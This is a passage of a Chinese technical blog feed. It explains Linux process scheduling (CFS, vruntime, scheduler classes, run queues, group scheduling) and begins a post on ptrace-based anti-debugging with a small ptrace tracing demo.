<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pop IP</div><div class="line">pop CS</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Intel </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux进程调度]]></title>
      <url>/2017/12/18/Linux%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6/</url>
      <content type="html"><![CDATA[<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-01-25%20%E4%B8%8A%E5%8D%8812.49.24.png" alt=""></p>
<p>关于进程的管理我们之前有一篇博客就已经说过，这次我们来说一下进程是如何进行调度的，这是确保进程能有效工作的一个内核子系统，让系统资源得到最大限度地发挥，同时这也是我们使用多线程并发执行的基础</p>
<a id="more"></a>
<h1 id="多任务"><a href="#多任务" class="headerlink" title="多任务"></a>多任务</h1><p>平时我们在工作的时候都会产生有多个进程在进行的幻觉，比如说我们同时开启好几个游戏，还可以和别人聊天，如果是在多处理器的机器上，这些进程是可能会真是的同时、并发运行的。</p>
<p>但是无论是在单处理器还是在多处理器的情况下，多任务操作系统都能使多个进程处于阻塞或者休眠状态，也就是说只有实际运行的时候才会投入运行，这个其实可以和我们操作系统中的<code>fork()</code>系统调用的写时拷贝机制类比一下。其他的时间，这些进程通过内核来阻塞自己，直到某一事件将它唤醒(触发事件生效)，这个在Linux系统中用<code>ps</code>命令就可以直观的看到:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-18%20%E4%B8%8B%E5%8D%886.06.14.png" alt="屏幕快照 2017-12-18 下午6.06.14.png" title="" class="">
                <p>屏幕快照 2017-12-18 下午6.06.14.png</p>
            </figure>
<p>大部分的进程都是处于<code>S</code>态，也就是<code>TASK_INTERUPTABLE</code>状态，只有一个处于<code>R+</code>态，也就是处于前台线程组，并且正在运行中(这也是因为我的云服务器是单核的)，这也验证了我们上面所说。</p>
<p>多任务操作系统其实可以分为两类：非抢占式多任务和抢占式多任务，这里主要就是说一下抢占式，因为非抢占式任务下除非进程自己主动停止运行，不然就会一直执行，这显然是一种非常不合理的机制，只需要一个一只占用的悬挂进程就会让整个系统崩溃掉了。而抢占式则是由调度程序来决定什么时候停止一个进程，抢占的意思就是说调度强制挂起一个进程，进程在被抢占之前能够运行的时间都是预先设置好的，这就是时间片的概念，这就相当于把之前的进程的各自为营变成调度进程来集权控制，也是基于安全中的最小信任原则，但是Linux并不是通过这种时间片的方式来达到公平的调度。</p>
<h1 id="调度策略"><a href="#调度策略" class="headerlink" title="调度策略"></a>调度策略</h1><p>Linux中的普通进程采用的是一种叫做CFS的算法来作为调度算法，全称翻译过来就是<code>完全公平调度算法</code>，这个算法倒是没有研究过，但是如果对这个算法的实现感兴趣的话可以参考这个<a href="https://www.cnblogs.com/tianguiyu/articles/6091378.html" target="_blank" rel="external">CFS的实现</a>，对于实时进程而言，通常采用FIFO或者Round Robin的调度策略。在Linux中的进程和线程调度看作是一个，因此进程的调度也包括了线程调度的过程。</p>
<p>对于实时进程来说，调度其实比较简单，因为优先级比较高，低优先级是不可能抢占高优先级的进程，使用FIFO这种调度就足矣，但是对于普通的进程来说不能只看优先级，必须公平的占有CPU，不然就会出现进程饥荒，导致整个操作系统用起来都会觉得十分的卡顿，linux总是在寻求一种最接近完美的调度策略来公平调度普通的进程</p>
<h2 id="进程类型"><a href="#进程类型" class="headerlink" title="进程类型"></a>进程类型</h2><p>进程可以被分为<code>I/O</code>消耗和处理器消耗类型（批处理进程），前者的意思也就是说进程的部分时间是用来提交<code>I/O</code>请求或者是等待<code>I/O</code>请求。因此，这样的进程经常处于可运行状态，但是通常的都是一瞬间，因为在等待<code>I/O</code>的时候都会处于阻塞状态(等待键盘吗，或者网络I/O)，这种情况在GUI中屡见不鲜。即便它们不会对硬盘读写，也会长时间等待用户交互操作。</p>
<p>相反的是处理器消耗类型的进程将大部分的时间用于执行代码，除非它们被抢占，不然就不会不停的运行。所以对于这种类型的进程，调度进程就会尽量减少对它的调度，而是尽量延长他的运行时间，但是我们需要注意的就是这两者之间的区分其实并不绝对，有的进程会同时拥有两种特性，例如X Window。</p>
<p>所以这也是Linux的聪明之处，在资源有限的情况下平等对待显然不是明智之举，所以我们需要通过算法来在矛盾之中寻求平衡(响应时间和高吞吐量)，在Unix/Linux中，都是会更倾向于优先调度<code>I/O</code>消耗的进程。</p>
<p>上面的两种进程都被统一的划分为非实时进程，至于实时进程是因为很强的调度需要，绝对不会被低优先级的进程阻塞，并且响应时间要尽量的段比如说视频音频应用，或者机器人控制传感器等。</p>
<h2 id="进程优先级"><a href="#进程优先级" class="headerlink" title="进程优先级"></a>进程优先级</h2><p>之前说过我们的系统有着一套算法来对进程进行调度，调度算法中最基本的一类就是通过优先级的调度，这是根据进程的价值和其对处理器的时间需求对进程来分级的一种想法。</p>
<p>Linux中采用了两种不同的优先级范围。第一种是用<code>nice</code>值,范围从-20~+19，默认是0，这个是越小意为着优先级越高。nice值是所有Unix系统中的标准化概念，我们可以通过命令来看看，NI那一条就是代表着<code>nice</code>值：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-18%20%E4%B8%8B%E5%8D%886.48.32.png" alt="屏幕快照 2017-12-18 下午6.48.32.png" title="" class="">
                <p>屏幕快照 2017-12-18 下午6.48.32.png</p>
            </figure>
<p>第二种是实时优先级，默认情况下是0~99，这个优先级关系和<code>nice</code>相反，数值越大越优先，但是这个显示的是实时进程，实时进程的优先级都会高于普通的优先级，也就是这两种优先级范围其实并不冲突，你也可以理解为实时进程是瘦死的骆驼比马大，差不多就是这个意思，同样通过命令看一下：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-18%20%E4%B8%8B%E5%8D%886.52.22.png" alt="屏幕快照 2017-12-18 下午6.52.22.png" title="" class="">
                <p>屏幕快照 2017-12-18 下午6.52.22.png</p>
            </figure>
<p>如果进程列表显示的是<code>-</code>，那么说明他不是实时进程。</p>
<h2 id="时间片"><a href="#时间片" class="headerlink" title="时间片"></a>时间片</h2><p>时间片是一个数值，这个值表示的是进程在被抢占之前所能运行的时间。调度的策略必须规定一个默认的时间片,首先，Linux中的CFS调度器并没有直接的分配这种时间片，而是通过将处理器按比例划分，而且这个比例还会进一步受到<code>nice</code>值的影响，所以其实一个进程是否会被抢占会受到多种因素的影响。</p>
<p>打一个比方，现在有一个文字编辑器，还有一个视频的解码器，显然前者是I/O消耗型的，因为它大部分的时间都在等待用户的输入，也就是等待被唤醒的状态(CPU进行进程切换的速度非常快，手速再快也是赶不上了的)。这种情况下要求的是响应的即时性，而视频的解码是属于处理器消耗型的，这个对于时间的要求显然没有那样的严格，所以就算这两者都是实时进程，而且它们的<code>nice</code>值是相同的，理论上来说它们优先级一样，谁也不会抢占谁的，平分处理器的资源。</p>
<p>但是文本编辑显然用不到50%的处理器资源，所以这个时候相应的CFS调度器总会毫不犹豫的让文本编辑器需要运行的时候去抢占当前的进程，而视频编码则是在剩下的时间进行处理。</p>
<p>之前就说过我们的CFS调度器不是简单的通过时间片的大小去分配每个进程的占有时间，CFS采用的是对时间片分配方式的根本性的重新设计，相当于是从算数加权变成了几何加权。下面举个例子吧:</p>
<ul>
<li>算数加权的情况下：</li>
</ul>
<p>假设一个默认使用的时间片是100ms，一个<code>nice</code>值为5所能使用的标准时间片是75ms的话，那么<code>nice</code>值为15就意味着是25ms.</p>
<ul>
<li>几何加权的情况下:</li>
</ul>
<p>如果这个时候的目标延迟是20ms，这个时候有两个进程，<code>nice</code>值分别为0,5，假设这个时候分配到的时间是15ms和5ms，那么对于<code>nice</code>值是10和15来说的，同样是15ms和5ms。这里就是根据<code>nice</code>值来计算权重了。</p>
<p>这样子在多进程的环境下，就降低了延迟带来的不公平。</p>
<h2 id="时钟节拍"><a href="#时钟节拍" class="headerlink" title="时钟节拍"></a>时钟节拍</h2><p>任何操作系统都需要提供一个时钟节拍，以供系统处理诸如延时，超时之类的操作，时钟节拍是特定的周期性中断，这个中断可以看作是系统的心跳，中断之间的时间间隔取决于不同的应用。时钟的节拍中断可以使得内核将任务延迟若干个时钟节拍。那么这个玩意的意义何在呢？就是实现延时和超时的控制，下面看一张图来描述时钟节拍的中断:</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-18%20%E4%B8%8B%E5%8D%8811.18.48.png" alt="屏幕快照 2017-12-18 下午11.18.48.png" title="" class="">
                <p>屏幕快照 2017-12-18 下午11.18.48.png</p>
            </figure>
<p>这个时候由于时钟节拍发生，进程从运行到阻塞态，然后就给其他的进程有了执行的机会，直到下一次轮询到它(时钟节拍)，然后载恢复运行态，抢占进程。</p>
<h1 id="调度器"><a href="#调度器" class="headerlink" title="调度器"></a>调度器</h1><p>通常而言我们有两种方式去激活调度，一种就是当前进程主动进入睡眠或者其他原因放弃CPU，另一种就是通过周期性的中断来时不时的进行检测，比如说上面提到的时钟节拍。当前linux的调度程序有两个调度器组成：<code>主调度器</code>和<code>周期性调度器</code>，每个调度器中所包含的内容就是调度框架和调度类。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-19%20%E4%B8%8B%E5%8D%882.50.52.png" alt="屏幕快照 2017-12-19 下午2.50.52.png" title="" class="">
                <p>屏幕快照 2017-12-19 下午2.50.52.png</p>
            </figure>
<p>目前linux内核中实现了下面几种调度策略也就是调度算法：</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
<th>所在调度器类</th>
</tr>
</thead>
<tbody>
<tr>
<td>SCHED_NORMAL</td>
<td>（也叫SCHED_OTHER）用于普通进程，通过CFS调度器实现。SCHED_BATCH用于非交互的处理器消耗型进程。SCHED_IDLE是在系统负载很低时使用</td>
<td>CFS</td>
</tr>
<tr>
<td>SCHED_BATCH</td>
<td>SCHED_NORMAL普通进程策略的分化版本。采用分时策略，根据动态优先级(可用nice()API设置），分配CPU运算资源。注意：这类进程比上述两类实时进程优先级低，换言之，在有实时进程存在时，实时进程优先调度。但针对吞吐量优化, 除了不能抢占外与常规任务一样，允许任务运行更长时间，更好地使用高速缓存，适合于成批处理的工作</td>
<td>CFS</td>
</tr>
<tr>
<td>SCHED_IDLE</td>
<td>优先级最低，在系统空闲时才跑这类进程(如利用闲散计算机资源跑地外文明搜索，蛋白质结构分析等任务，是此调度策略的适用者）</td>
<td>CFS-IDLE</td>
</tr>
<tr>
<td>SCHED_FIFO</td>
<td>先入先出调度算法（实时调度策略），相同优先级的任务先到先服务，高优先级的任务可以抢占低优先级的任务</td>
<td>RT</td>
</tr>
<tr>
<td>SCHED_RR</td>
<td>轮流调度算法（实时调度策略），后者提供 Roound-Robin 语义，采用时间片，相同优先级的任务当用完时间片会被放到队列尾部，以保证公平性，同样，高优先级的任务可以抢占低优先级的任务。不同要求的实时任务可以根据需要用sched_setscheduler() API设置策略</td>
<td>RT</td>
</tr>
<tr>
<td>SCHED_DEADLINE</td>
<td>新支持的实时进程调度策略，针对突发型计算，且对延迟和完成时间高度敏感的任务适用。基于Earliest Deadline First (EDF) 调度算法</td>
<td>DL</td>
</tr>
</tbody>
</table>
<p>而根据调度策略的不同实现了5个调度器类，一个调度器类可以用一种或者多种调度策略去调度某一类进程，也可以用于特殊情况或调度特殊功能的进程：</p>
<table>
<thead>
<tr>
<th>调度器类</th>
<th>描述</th>
<th>对应调度策略</th>
</tr>
</thead>
<tbody>
<tr>
<td>stop_sched_class</td>
<td>优先级最高的线程，会中断所有其他线程，且不会被其他任务打断作用1.发生在cpu_stop_cpu_callback 进行cpu之间任务migration2.HOTPLUG_CPU的情况下关闭任务</td>
<td>无, 不需要调度普通进程</td>
</tr>
<tr>
<td>dl_sched_class</td>
<td>采用EDF最早截至时间优先算法调度实时进程</td>
<td>SCHED_DEADLINE</td>
</tr>
<tr>
<td>rt_sched_class</td>
<td>采用提供 Roound-Robin算法或者FIFO算法调度实时进程具体调度策略由进程的task_struct-&gt;policy指定</td>
<td>SCHED_FIFO, SCHED_RR</td>
</tr>
<tr>
<td>fair_sched_class</td>
<td>采用CFS算法调度普通的非实时进程</td>
<td>SCHED_NORMAL, SCHED_BATCH</td>
</tr>
<tr>
<td>idle_sched_class</td>
<td>采用CFS算法调度idle进程, 每个cup的第一个pid=0线程：swapper，是一个静态线程。调度类属于：idel_sched_class，所以在ps里面是看不到的。一般运行在开机过程和cpu异常的时候做dump</td>
<td>SCHED_IDLE</td>
</tr>
</tbody>
</table>
<p>其所属进程的优先级顺序为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stop_sched_class -&gt; dl_sched_class -&gt; rt_sched_class -&gt; fair_sched_class -&gt; idle_sched_class</div></pre></td></tr></table></figure>
<h2 id="调度实体"><a href="#调度实体" class="headerlink" title="调度实体"></a>调度实体</h2><p>调度器不限于调度进程，还可以实现组的调度。在实际中，首先按所有者分组分配，然后在组内进行二次分配。这个时候调度器直接调度的对象就不再是进程，而是一个可调度实体，我们用一个数据结构去描述这个调度实体，也就是<code>sched_entity</code>，它就代表了一个调度对象，可以是一个进程，也可以是一个进程组。</p>
<p>linux中针对当前可调度的实时和非实时进程, 定义了类型为seched_entity的3个调度实体 </p>
<table>
<thead>
<tr>
<th>调度实体</th>
<th>名称</th>
<th>描述</th>
<th>对应调度器类</th>
</tr>
</thead>
<tbody>
<tr>
<td>sched_dl_entity</td>
<td>DEADLINE调度实体</td>
<td>采用EDF算法调度的实时调度实体</td>
<td>dl_sched_class</td>
</tr>
<tr>
<td>sched_rt_entity</td>
<td>RT调度实体</td>
<td>采用Roound-Robin或者FIFO算法调度的实时调度实体</td>
<td>rt_sched_class</td>
</tr>
<tr>
<td>sched_entity</td>
<td>CFS调度实体</td>
<td>采用CFS算法调度的普通非实时进程的调度实体</td>
<td>fair_sched_class</td>
</tr>
</tbody>
</table>
<h2 id="就绪队列"><a href="#就绪队列" class="headerlink" title="就绪队列"></a>就绪队列</h2><p>另外对于调度框架和调度器类，都有着它们自己管理的运行队列，调度框架只识别<code>rq</code>(run queue)，对于cfs调度器类它只识别<code>cfs_rq</code>（内部使用红黑树组织调度实体），实时rt的运行队列则为rt_rq（内部使用优先级bitmap+双向链表组织调度实体）, 此外内核对新增的dl实时调度策略也提供了运行队列dl_rq。</p>
<p>在早期的时候，这个就绪队列是全局的，但是出现了多核之后，这种方式显然不能满足对于性能的需求，于是就变成了一个CPU一个就绪队列，也就不需要再使用大内核锁这种玩意了。</p>
<p>进程并不是直接由就绪队列进行管理的，在就绪队列中嵌入了特定调度类的子就绪队列：</p>
<ol>
<li>cfs的调度队列是<code>struct cfs_rq</code></li>
<li>实时调度类的就绪队列是<code>struct rt_rq</code></li>
<li>deadline调度类的就绪队列<code>struct dl_rq</code></li>
</ol>
<p>每个CPU都有着自己的这种就绪队列结构，其包括一个实时进程队列和一个根CFS运行队列，在调度时，调度器首先会先去实时进程队列找是否有实时进程需要运行，如果没有才会去CFS运行队列找是否有进行需要运行，这就是为什么常说的实时进程优先级比普通进程高，不仅仅体现在prio优先级上，还体现在调度器的设计上，至于dl运行队列，我暂时还不知道有什么用处，其优先级比实时进程还高，但是创建进程时如果创建的是dl进程创建会错误(具体见sys_fork)，这样以来我们整个的过程就会变得清晰明了起来了，下面是一个从一个进程到就绪队列的属性关系图：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-19%20%E4%B8%8B%E5%8D%882.51.43.png" alt="屏幕快照 2017-12-19 下午2.51.43.png" title="" class="">
                <p>屏幕快照 2017-12-19 下午2.51.43.png</p>
            </figure>
<h1 id="调度实现"><a href="#调度实现" class="headerlink" title="调度实现"></a>调度实现</h1><p>那么大概了解到了Linux中的进程调度和CFS调度器之后，就要看看这个到底是如何得以实现的了，这里就直说CFS调度器类的实现，因为在我们的操作系统中大部分的进程都是普通进程，相关的代码可以直接去参考API，博客下方有直通车，这里我们主要关注的是四个部分：</p>
<ul>
<li>时间记账</li>
<li>进程选择</li>
<li>调度器的入口</li>
<li>睡眠和唤醒</li>
</ul>
<h2 id="时间记账"><a href="#时间记账" class="headerlink" title="时间记账"></a>时间记账</h2><p>那么我们都知道时间片的机制是通过计算每个进程它的时间片消耗，那么这个的具体实现依赖的就是时钟节拍，每过一个时钟节拍，时间片就会被减少一个节拍周期。当一个进程的时间片减少到0的时候，就会被另一个持有时间片剩余的进程给抢占，所以将这个描述为是在给时间记账是再合适不过了。</p>
<h2 id="虚拟实时"><a href="#虚拟实时" class="headerlink" title="虚拟实时"></a>虚拟实时</h2><p>调度器的实体结构可以参考上面的那张图，也就是<code>sched_entity</code>，这是作为一个成员变量嵌入在进程描述符之中，在组调度关闭的时候都可以把它等同为进程，我们会发现这个实体结构中还有一个属性是<code>vruntime</code>，这个就是我们通过所有可运行进程总数加权算出来的虚拟时间。</p>
<p>在这个时候，我们的<code>vruntime</code>和时钟节拍的关系其实就已经没有什么关系了，在CFS的调度中，可以算是对普通进程实现了平等，首先我们来看看虚拟时间计算的公式:</p>
<blockquote>
<p>vruntime = 实际运行时间 * 1024 / 进程权重 (这里的1024其实是为了方便理解，其实就是nice值=0的进程的犬种，代码中是<code>NICE_0_LOAD</code>，也就是说，所有进程都是以nice为0的进程作为基准计算)</p>
<p>分配给进程的运行时间 = 调度周期 * 进程权重 / 所有进程权重之和</p>
<p>vruntime =（ 调度周期 <em> 进程权重 / 所有进程权重之和 ）</em>1024 / 进程权重 = 调度周期 * 1024 / 所有进程权重之和</p>
</blockquote>
<p>那么从公式我们就可以看出来所有进程的增长速度在宏观上来看应该是同步推进的，只是优先级较高的进程会获得更多的运行时间，这样一来就可以保证优先级进程获得较多的运行时间，又可以公平的选择进程。权重越大的增加的越慢，这样就可以获得更多的cpu执行时间。</p>
<p>在这里还要补充一下权重和<code>nice</code>值之间的转换，它们是通过一个全局数组<code>prio_to_weight</code>来转换，<code>nice</code>值越大，权重越低。接下来就是学习一下CFS的数据结构。</p>
<h2 id="进程选择"><a href="#进程选择" class="headerlink" title="进程选择"></a>进程选择</h2><p>当CFS需要选择下一个运行进程的时候，他会挑选一个<code>vruntime</code>最小的进程。在Linux中，CFS使用红黑树来组织可运行进程队列，红黑树称作<code>rbtree</code>，这是一个自平衡的二叉搜索树。所有的<code>sched_entity</code>以vruntime为key(实际上是以vruntime-min_vruntime为key，是为了防止溢出，反正结果是一样的)插入到红黑树中，同时缓存树的最左侧节点，也就是vruntime最小的节点，这样可以迅速选中vruntime最小的进程。    </p>
<p>那么为什么<code>vruntime</code>的实际取值要原始取值减去一个最小的虚拟时间计时呢？这就是因为只有累死的牛，没有耕坏的地，人力有尽时，因为时间不断增长，这个值总有溢出的一天，所以运行队列的<code>min_vruntime</code>就是专门处理溢出问题的</p>
<p>⚠️：注意只有等待CPU的就绪态进程在这棵树上，睡眠进程和正在运行的进程都不在树上。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-19%20%E4%B8%8B%E5%8D%8810.36.21.png" alt="屏幕快照 2017-12-19 下午10.36.21.png" title="" class="">
                <p>屏幕快照 2017-12-19 下午10.36.21.png</p>
            </figure>
<p>进程调度的时候首先肯定不是从CFS调度器中寻找可调度实体，因为这是一个普通进程队列，而是要去一个最高优先级的调度类中去寻找最高优先级的进程(这个类必须要有自己的可运行队列)。</p>
<h2 id="组调度"><a href="#组调度" class="headerlink" title="组调度"></a>组调度</h2><p>简单来说，引入组调度是为了实现做一件事的一组进程与做另一件事的另一组进程的隔离。每件“事情”各自有自己的权重，而不管它需要使用多少进程来完成。</p>
<p>在cfs中，task_group和进程是同等对待的，task_group的优先级也由用户来控制（通过cgroup文件cpu.shares）。实现上，task_group和进程都被抽象成schedule_entity（调度实体，以下简称se），上面说到的vruntime、load、等这些东西都被封装在se里面。而task_group除了有se之外，还有cfs_rq。</p>
<p>属于这个task_group的进程就被装在它的cfs_rq中（“组”不仅是一个被调度的实体，也是一个容器）。组调度引入以后，一系列task_group的cfs_rq组成了一个树型结构。树根是cpu所对应的cfs_rq（也就是root group的cfs_rq）、树的中间节点是各个task_group的cfs_rq、叶子节点是各个进程。在一个task_group的两头，是两个不同的世界，就像《盗梦空间》里不同层次的梦境一样。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-19%20%E4%B8%8B%E5%8D%8811.11.47.png" alt="屏幕快照 2017-12-19 下午11.11.47.png" title="" class="">
                <p>屏幕快照 2017-12-19 下午11.11.47.png</p>
            </figure>
<p>以group-1为例，它所对应的se被加入到父组（cpu_rq）的cfs_rq中，接受调度。这个se有自己的load（由对应的cpu.shares文件来配置），不管group-1下面有多少个进程，这个load都是这个值。父组看不到、也不关心group-1下的进程。父组只会根据这个se的load和它执行的时间来更新其vruntime。当group-1被调度器选中后，会继续选择其下面的task-11或task-12来执行。这里又是一套独立的体系，task-11与task-12的vruntime、load、等这些东西只影响它们在group-1的cfs_rq中的调度情况。树型结构中的每一个cfs_rq都是独立完成自己的调度逻辑。不过，从cpu配额上看，task_group的配额会被其子孙层层瓜分。    </p>
<p>例如上图中的task-11，它所在的group-1对应se的load是8，而group-1下两个进程的load是9和3，task-11占其中的3/4。于是，在group-1所对应的cfs_rq内部看，task-11的load是9，而从全局来看，task-11的load是8 <em> 3/4=6。而task_group下的进程的时间片也是这样层层瓜分而来的，比如说group-1的cfs_rq下只有两个进程，计算得来的调度延迟是20ms。但是task-11并非占其中的3/4（15ms）。因为group-1的se的load占总额的8/(8+3+5)=1/2，所以task-11的load占总额的1/2</em>3/4=3/8，时间片是20ms*3/8=7.5ms。</p>
<p>这样的瓜分有可能使得task_group里面的进程分得很小的时间片，从而导致频繁re-schedule。不过好在这并不影响task_group外面的其他进程，并且也可以尽量让task_group里面的进程在每个调度延迟内都执行一次。    </p>
<p>cfs曾经有过时间片不层层瓜分的实现，比如上图中的task-11，时间片算出来是15ms就是15ms，不用再瓜分了。这样做的好处是不会有频繁的re-schedule。但是task_group里的进程可能会很久才被执行一次。瓜分与不瓜分两种方案的示例如下（还是继续上图的例子，深蓝色代表task-11、浅蓝色是task-12，空白是其他进程）：     </p>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-19%20%E4%B8%8B%E5%8D%8811.16.17.png" alt="屏幕快照 2017-12-19 下午11.16.17.png"></p>
<p>两种方案好像很难说清孰优孰劣，貌似cfs也在这两种方案间纠结了好几次。在进程用完其时间片之前，有可能它所在的task_group的se先用完了时间片，而被其父组re-schedule掉。这种情况下，当这个task_group的se再一次被其父组选中时，上次得到执行、且尚未用完时间片的那个进程将继续运行，直到它用完时间片。（cfs_rq-&gt;last会记录下这个尚未用完时间片的进程。）</p>
<h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><ul>
<li><a href="http://elixir.free-electrons.com/" target="_blank" rel="external">linux内核api查询</a></li>
<li><a href="http://blog.csdn.net/gatieme/article/details/51702662" target="_blank" rel="external">Linux进程调度器设计</a></li>
<li><a href="http://blog.csdn.net/yusiguyuan/article/details/39404399" target="_blank" rel="external">Linux内核进程调度策略</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 进程调度 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[反动态调试保护]]></title>
      <url>/2017/12/14/%E5%8F%8D%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E4%BF%9D%E6%8A%A4/</url>
      <content type="html"><![CDATA[<p>今天在社区中看到snakeninny大神写的一个干掉高德地图iOS客户端的反动态调试保护，之前只知道通过加壳的方式去干扰逆向的我心生好奇，决定看看这个保护是如何去实现的（首先声明，下面所做实验全都是在32位的机器下）</p>
<a id="more"></a>
<h1 id="0X00基础知识"><a href="#0X00基础知识" class="headerlink" title="0X00基础知识"></a>0X00基础知识</h1><p>你想过怎么实现对系统调用的拦截吗？你尝试过通过改变系统调用的参数来愚弄你的系统kernel吗？你想过调试器是如何使运行中的进程暂停并且控制它吗？</p>
<p>你可能会开始考虑怎么使用复杂的kernel编程来达到目的，那么，你错了。实际上Linux提供了一种优雅的机制来完成这些：ptrace系统函数。 ptrace提供了一种使父进程得以监视和控制其它进程的方式，它还能够改变子进程中的寄存器和内核映像，因而可以实现断点调试和系统调用的跟踪。使用ptrace，你可以在用户层拦截和修改系统调用(sys call)。那么我们的反动态调试保护的机制也是基于这个ptrace函数，而且这个也是目前公开的反动态调试保护的方法。</p>
<p>当一个程序需要做系统调用的时候，它会将相关参数放进系统调用的相关寄存器，然后调用软中断0x80(不一定)，这个中断就像一个让程序接触到内核模式的窗口<strong>(因为用户态的程序想要做系统调用的时候是必须交给内核态做审核的)</strong>这个时候，程序将参数和系统调用号交给内核之后，内核完成接下来的调用执行，接下来我们可以举个例子，系统调用号将放入%eax，接下来的参数则依次放入%ebx.%ecx,%edx,%esi,%edi。（AT&amp;T汇编体系的汇编代码）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">; Write(2, &quot;Hello&quot;, 5)这个调用的汇编形式</div><div class="line">movl $4, %eax ;系统调用号</div><div class="line">movl $2, %ebx</div><div class="line">movl $hello, %ecx</div><div class="line">movl $5, %edx</div><div class="line">int  $0x80 ;软中断</div></pre></td></tr></table></figure>
<p>那么，我们的ptrace是在什么时候出现的呢，操作系统在执行系统调用之前，内核会首先检查当前进程是否处于<code>traced</code>的状态。如果是的话，内核就会暂停当前进程并将控制权交给跟踪进程，让跟踪进程得以查看或者修改被跟踪进程的寄存器，下面用一段代码来演示这个跟踪程序的过程:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reg.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">  <span class="keyword">pid_t</span> child;</div><div class="line">  <span class="keyword">long</span> orig_eax;</div><div class="line">  child = fork();</div><div class="line">  <span class="keyword">if</span>(child == <span class="number">0</span>)&#123;</div><div class="line">    ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">    execl(<span class="string">"/bin/ls"</span>, <span class="string">"ls"</span>, <span class="literal">NULL</span>;</div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    wait(<span class="literal">NULL</span>);</div><div class="line">    orig_eax = ptrace(PTRACE_PEEKUSER, child, <span class="number">4</span> * ORIG_EAX, <span class="literal">NULL</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"The child made a system call %ld \n"</span>, orig_eax);</div><div class="line">    ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在上面的代码中，是我在Ubuntu上可以运行的一段代码,执行之后的结果如下图所示：<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-12-15%20%E4%B8%8A%E5%8D%8810.24.47.png" alt="屏幕快照 2017-12-15 上午10.24.47.png" title="" class="">
                <p>屏幕快照 2017-12-15 上午10.24.47.png</p>
            </figure></p>
